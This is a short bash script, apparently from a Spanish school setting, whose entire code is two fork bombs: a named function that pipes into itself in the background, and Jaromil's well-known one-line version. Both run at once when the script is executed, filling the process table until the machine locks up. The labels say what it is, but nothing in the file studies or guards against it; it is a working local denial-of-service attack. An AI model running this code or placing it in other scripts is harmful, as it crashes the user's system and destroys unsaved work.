#!/usr/bin/env bash

# @Author: AlexHernandez <Alex>
# @Date:   27-10-2018
# @Email:  ahernandezmartin@educa.madrid.org
# @Last modified by:   Alex
# @Last modified time: 27-10-2018

# ------ Version 1 la bomba Funcion
funcion() {
    funcion | funcion &
};
funcion

# ------ Version 2 la bomba Jaromil
:() { : | : & };:
